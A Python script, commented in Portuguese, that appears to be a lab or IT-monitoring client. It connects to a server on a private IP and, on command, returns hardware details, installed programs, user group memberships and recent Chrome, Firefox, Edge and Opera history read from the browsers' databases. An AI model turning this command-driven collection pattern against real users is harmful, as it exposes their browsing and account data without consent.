import socket, sys, time, os, getpass, platform, shutil, subprocess, sqlite3, tempfile

# Configuração do servidor
SERVER_IP = '192.168.1.20'
SERVER_PORT = 5002  # Porta para comunicação com o servidor

# Define o caminho correto para o arquivo de bloqueio
if os.name == 'nt':  # Windows
    LOCK_DIR = 'C:\\temp'
    LOCK_FILE = os.path.join(LOCK_DIR, 'agente.lock')
else:  # Linux
    LOCK_DIR = '/tmp'
    LOCK_FILE = os.path.join(LOCK_DIR, 'agente.lock')

def verificar_instancia():
    """Impede que mais de uma instância do cliente seja executada."""
    try:
        if not os.path.exists(LOCK_DIR):
            os.makedirs(LOCK_DIR)
        if os.path.exists(LOCK_FILE):
            print("⚠️ O agente já está em execução!")
            sys.exit()
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
    except Exception as e:
        print(f"❌ Erro ao criar arquivo de bloqueio: {e}")
        sys.exit()

def remover_arquivo_bloqueio():
    """Remove o arquivo de bloqueio e encerra o programa corretamente."""
    print("\n⏹️ Cliente encerrado pelo usuário.")
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    sys.exit()

def obter_dados_do_sistema():
    """Obtém o nome do host, IP e usuário logado."""
    host = socket.gethostname()
    try:
        ip = socket.gethostbyname(host)
    except socket.gaierror:
        ip = "IP não encontrado"
    usuario = os.environ.get('USERNAME', 'Usuário desconhecido') if os.name == 'nt' else getpass.getuser()
    return host, ip, usuario

def obter_info_hardware():
    """Coleta informações de hardware do sistema sem usar bibliotecas de terceiros."""
    info = ""
    # Informações do Sistema Operacional
    os_info = platform.platform()
    info += f"Sistema Operacional: {os_info}\n"
    # Informações da CPU
    cpu_info = platform.processor() or "Informação indisponível"
    cores = os.cpu_count() or "Indisponível"
    info += f"Processador: {cpu_info}\n"
    info += f"Número de Núcleos: {cores}\n"
    # Informações de Memória
    if platform.system() == "Windows":
        try:
            output = subprocess.check_output(
                ["wmic", "OS", "get", "TotalVisibleMemorySize,FreePhysicalMemory", "/Value"],
                shell=True, stderr=subprocess.DEVNULL
            )
            output = output.decode()
            total_mem = None
            free_mem = None
            for line in output.splitlines():
                if line.startswith("TotalVisibleMemorySize="):
                    total_mem = int(line.split("=")[1].strip())
                elif line.startswith("FreePhysicalMemory="):
                    free_mem = int(line.split("=")[1].strip())
            if total_mem and free_mem:
                info += f"Memória Total: {total_mem/1024:.2f} MB\n"
                info += f"Memória Livre: {free_mem/1024:.2f} MB\n"
            else:
                info += "Informação de memória não disponível.\n"
        except Exception as e:
            info += f"Erro ao obter informações de memória: {e}\n"
    else:
        try:
            with open("/proc/meminfo", "r") as f:
                meminfo = f.readlines()
            mem_total = None
            mem_available = None
            for line in meminfo:
                if "MemTotal:" in line:
                    mem_total = int(line.split()[1])
                elif "MemAvailable:" in line:
                    mem_available = int(line.split()[1])
            if mem_total and mem_available:
                info += f"Memória Total: {mem_total/1024:.2f} MB\n"
                info += f"Memória Disponível: {mem_available/1024:.2f} MB\n"
            else:
                info += "Informação de memória não disponível.\n"
        except Exception as e:
            info += f"Erro ao obter informações de memória: {e}\n"
    # Informações do Disco
    try:
        du = shutil.disk_usage("/")
        total = du.total / (1024**3)
        used = du.used / (1024**3)
        free = du.free / (1024**3)
        info += f"Disco Total: {total:.2f} GB\n"
        info += f"Disco Usado: {used:.2f} GB\n"
        info += f"Disco Livre: {free:.2f} GB\n"
    except Exception as e:
        info += f"Erro ao obter informações do disco: {e}\n"
    return info

def obter_programas_instalados():
    """
    Lista os programas instalados ordenados alfabeticamente e exibe um cabeçalho com:
      - Ordem utilizada
      - Total de programas instalados
      - Programas listados
      - Programas não listados
    """
    system = platform.system()
    if system == "Windows":
        try:
            output = subprocess.check_output(
                ["wmic", "product", "get", "name"],
                shell=True, stderr=subprocess.DEVNULL
            )
            output = output.decode(errors="ignore")
            linhas = [line.strip() for line in output.splitlines() if line.strip()]
            if linhas and linhas[0].lower() == "name":
                raw_programas = linhas[1:]
            else:
                raw_programas = linhas[:]
            total_programas = len(raw_programas)
            programas_listados = [p for p in raw_programas if p not in ["", "N/A"]]
            nao_listados = total_programas - len(programas_listados)
            programas_listados.sort()
            header = (
                f"Ordem: Alfabética\n"
                f"Total de programas instalados: {total_programas}\n"
                f"Programas listados: {len(programas_listados)}\n"
                f"Programas não listados: {nao_listados}\n"
            )
            if programas_listados:
                return header + "\n" + "\n".join(programas_listados)
            else:
                return "Nenhum programa encontrado ou acesso negado."
        except Exception as e:
            return f"Erro ao obter programas instalados: {e}"
    elif system == "Linux":
        if shutil.which("dpkg"):
            try:
                output = subprocess.check_output(["dpkg", "-l"], stderr=subprocess.DEVNULL)
                output = output.decode(errors="ignore")
                linhas = output.splitlines()
                raw_programas = []
                for linha in linhas[5:]:
                    partes = linha.split()
                    if len(partes) >= 2:
                        raw_programas.append(partes[1])
                total_programas = len(raw_programas)
                programas_listados = [p for p in raw_programas if p not in ["", "N/A"]]
                nao_listados = total_programas - len(programas_listados)
                programas_listados.sort()
                header = (
                    f"Ordem: Alfabética\n"
                    f"Total de programas instalados: {total_programas}\n"
                    f"Programas listados: {len(programas_listados)}\n"
                    f"Programas não listados: {nao_listados}\n"
                )
                if programas_listados:
                    return header + "\n" + "\n".join(programas_listados)
                else:
                    return "Nenhum programa encontrado."
            except Exception as e:
                return f"Erro ao obter programas instalados: {e}"
        elif shutil.which("rpm"):
            try:
                output = subprocess.check_output(["rpm", "-qa"], stderr=subprocess.DEVNULL)
                output = output.decode(errors="ignore")
                raw_programas = [line.strip() for line in output.splitlines() if line.strip()]
                total_programas = len(raw_programas)
                programas_listados = [p for p in raw_programas if p not in ["", "N/A"]]
                nao_listados = total_programas - len(programas_listados)
                programas_listados.sort()
                header = (
                    f"Ordem: Alfabética\n"
                    f"Total de programas instalados: {total_programas}\n"
                    f"Programas listados: {len(programas_listados)}\n"
                    f"Programas não listados: {nao_listados}\n"
                )
                if programas_listados:
                    return header + "\n" + "\n".join(programas_listados)
                else:
                    return "Nenhum programa encontrado."
            except Exception as e:
                return f"Erro ao obter programas instalados: {e}"
        else:
            return "Método não implementado para listar programas instalados neste sistema Linux."
    else:
        return "Listagem de programas instalados não implementada para este sistema operacional."

def historico_chrome():
    """ Retorna os 5 registros mais recentes do histórico do Chrome. """
    history_str = "Histórico do Chrome:\n"
    try:
        if os.name == "nt":
            # Windows
            path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "History")
        else:
            # Linux: tenta o caminho do Google Chrome ou do Chromium
            home = os.path.expanduser("~")
            path1 = os.path.join(home, ".config", "google-chrome", "Default", "History")
            path2 = os.path.join(home, ".config", "chromium", "Default", "History")
            if os.path.exists(path1):
                path = path1
            elif os.path.exists(path2):
                path = path2
            else:
                return "Chrome: Histórico não encontrado.\n"
        if not os.path.exists(path):
            return "Chrome: Histórico não encontrado.\n"
        # Copia o arquivo para um local temporário
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.close()
        shutil.copy2(path, temp_file.name)
        conn = sqlite3.connect(temp_file.name)
        cursor = conn.cursor()
        # Consulta: 'urls' contém os registros do histórico.
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")
        rows = cursor.fetchall()
        if rows:
            for row in rows:
                url, title, last_visit_time = row
                history_str += f"URL: {url}\nTítulo: {title}\n\n"
        else:
            history_str += "Nenhum registro encontrado.\n"
        conn.close()
        os.unlink(temp_file.name)
    except Exception as e:
        history_str += f"Erro ao obter histórico do Chrome: {e}\n"
    return history_str

def historico_firefox():
    """ Retorna os 5 registros mais recentes do histórico do Firefox. """
    history_str = "Histórico do Firefox:\n"
    try:
        if os.name == "nt":
            base_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        else:
            base_path = os.path.join(os.path.expanduser("~"), ".mozilla", "firefox")
        if not os.path.exists(base_path):
            return "Firefox: Histórico não encontrado.\n"
        # Procura por um perfil que contenha o arquivo places.sqlite
        profile_path = None
        for folder in os.listdir(base_path):
            candidate = os.path.join(base_path, folder, "places.sqlite")
            if os.path.exists(candidate):
                profile_path = candidate
                break
        if profile_path is None:
            return "Firefox: Histórico não encontrado.\n"
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.close()
        shutil.copy2(profile_path, temp_file.name)
        conn = sqlite3.connect(temp_file.name)
        cursor = conn.cursor()
        # A tabela moz_places contém as URLs
        cursor.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 5")
        rows = cursor.fetchall()
        if rows:
            for row in rows:
                url, title, last_visit_date = row
                history_str += f"URL: {url}\nTítulo: {title}\n\n"
        else:
            history_str += "Nenhum registro encontrado.\n"
        conn.close()
        os.unlink(temp_file.name)
    except Exception as e:
        history_str += f"Erro ao obter histórico do Firefox: {e}\n"
    return history_str

def historico_edge():
    """ Retorna os 5 registros mais recentes do histórico do Microsoft Edge. """
    history_str = "Histórico do Microsoft Edge:\n"
    try:
        if os.name == "nt":
            path = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data", "Default", "History")
        else:
            home = os.path.expanduser("~")
            path = os.path.join(home, ".config", "microsoft-edge", "Default", "History")
        if not os.path.exists(path):
            return "Edge: Histórico não encontrado.\n"
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.close()
        shutil.copy2(path, temp_file.name)
        conn = sqlite3.connect(temp_file.name)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")
        rows = cursor.fetchall()
        if rows:
            for row in rows:
                url, title, last_visit_time = row
                history_str += f"URL: {url}\nTítulo: {title}\n\n"
        else:
            history_str += "Nenhum registro encontrado.\n"
        conn.close()
        os.unlink(temp_file.name)
    except Exception as e:
        history_str += f"Erro ao obter histórico do Edge: {e}\n"
    return history_str

def historico_opera():
    """ Retorna os 5 registros mais recentes do histórico do Opera. """
    history_str = "Histórico do Opera:\n"
    try:
        if os.name == "nt":
            path = os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable", "History")
        else:
            home = os.path.expanduser("~")
            path1 = os.path.join(home, ".config", "opera", "History")
            path2 = os.path.join(home, ".config", "opera-stable", "History")
            if os.path.exists(path1):
                path = path1
            elif os.path.exists(path2):
                path = path2
            else:
                return "Opera: Histórico não encontrado.\n"
        if not os.path.exists(path):
            return "Opera: Histórico não encontrado.\n"
        temp_file = tempfile.NamedTemporaryFile(delete=False)
        temp_file.close()
        shutil.copy2(path, temp_file.name)
        conn = sqlite3.connect(temp_file.name)
        cursor = conn.cursor()
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 5")
        rows = cursor.fetchall()
        if rows:
            for row in rows:
                url, title, last_visit_time = row
                history_str += f"URL: {url}\nTítulo: {title}\n\n"
        else:
            history_str += "Nenhum registro encontrado.\n"
        conn.close()
        os.unlink(temp_file.name)
    except Exception as e:
        history_str += f"Erro ao obter histórico do Opera: {e}\n"
    return history_str

def historico_safari():
    """ Para Windows e Linux, o Safari geralmente não está disponível. """
    return "Safari: Histórico não disponível neste sistema.\n"

def obter_historico_navegacao():
    """Agrega os históricos dos navegadores em um único retorno."""
    historico = ""
    historico += historico_chrome() + "\n"
    historico += historico_firefox() + "\n"
    historico += historico_edge() + "\n"
    historico += historico_opera() + "\n"
    historico += historico_safari() + "\n"
    return historico

def obter_info_usuario():
    """ Obtém informações detalhadas do usuário logado. """
    info_usuario = ""

    usuario = getpass.getuser()
    home_dir = os.path.expanduser("~")  # Diretório inicial

    info_usuario += f"Usuário: {usuario}\n"
    info_usuario += f"Diretório inicial: {home_dir}\n"

    if platform.system() == "Windows":
        try:
            output = subprocess.check_output("chcp 65001 & whoami /groups", shell=True, text=True, encoding="utf-8", errors="ignore")

            # Extraindo apenas os nomes dos grupos
            grupos = []
            for line in output.splitlines():
                parts = line.split()  # Divide a linha em partes
                if len(parts) > 0 and "\\" in parts[0]:  # Filtra nomes de grupos válidos
                    grupos.append(parts[0].split("\\")[-1])  # Pega apenas o nome do grupo

            grupo_principal = grupos[0] if grupos else "Desconhecido"
            grupos_secundarios = ", ".join(grupos[1:]) if len(grupos) > 1 else "Nenhum"

            info_usuario += f"Grupo principal: {grupo_principal}\n"
            info_usuario += f"Grupos secundários: {grupos_secundarios}\n"
        except Exception as e:
            info_usuario += f"Erro ao obter grupos do usuário: {e}\n"

    else:  # Linux
        try:
            uid = os.getuid()
            gid = os.getgid()
            grupo_principal = subprocess.check_output(f"getent group {gid}", shell=True, text=True, encoding="utf-8").split(":")[0]
            grupos_secundarios = subprocess.check_output(f"groups {usuario}", shell=True, text=True, encoding="utf-8").strip().split(":")[-1].strip()
            shell = os.environ.get("SHELL", "Desconhecido")

            info_usuario += f"UID: {uid}\n"
            info_usuario += f"Grupo principal: {grupo_principal}\n"
            info_usuario += f"Grupos secundários: {grupos_secundarios}\n"
            info_usuario += f"Shell padrão: {shell}\n"
        except Exception as e:
            info_usuario += f"Erro ao obter informações do usuário: {e}\n"

    return info_usuario

def conectar_servidor():
    """Tenta conectar ao servidor e retorna o socket conectado ou None."""
    try:
        cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        cliente.settimeout(2)
        cliente.connect((SERVER_IP, SERVER_PORT))
        print("🔗 Conectado ao servidor.")
        return cliente
    except (ConnectionRefusedError, socket.timeout):
        print("⚠️ O servidor não está disponível. Tentando novamente em 5 segundos...")
        time.sleep(5)
        return None

def aguardar_comandos():
    """Mantém o cliente conectado e aguardando comandos do servidor."""
    print("🤖 Cliente (Agente) iniciado... Pressione Ctrl+C para encerrar e remover da memória.")
    try:
        while True:
            cliente_socket = conectar_servidor()
            if not cliente_socket:
                continue
            host, ip, usuario = obter_dados_do_sistema()
            dados_sistema = f"{host},{ip},{usuario}"
            cliente_socket.send(dados_sistema.encode())
            print(f"📤 Enviando dados ao servidor: {dados_sistema}")
            while True:
                try:
                    cliente_socket.settimeout(1)
                    comando = cliente_socket.recv(1024).decode()
                    if not comando:
                        raise ConnectionResetError
                    print(f"📨 Comando recebido: {comando}")
                    if comando == '/info_hardware':
                        resposta = obter_info_hardware()
                    elif comando == '/programas_instalados':
                        resposta = obter_programas_instalados()
                    elif comando == '/historico_navegacao':
                        resposta = obter_historico_navegacao()
                    elif comando == '/info_usuario':
                        resposta = obter_info_usuario()
                    elif comando == '/desconectar':
                        print("🔌 Desconectando do servidor conforme solicitado.")
                        remover_arquivo_bloqueio()
                    else:
                        resposta = "Comando não reconhecido."
                    cliente_socket.sendall(resposta.encode())
                    print(f"📤 Resposta enviada:\n{resposta}")
                except socket.timeout:
                    pass
                except ConnectionResetError:
                    print("❌ O servidor foi desligado. Tentando reconectar...")
                    break
    except KeyboardInterrupt:
        remover_arquivo_bloqueio()

if __name__ == "__main__":
    verificar_instancia()
    aguardar_comandos()
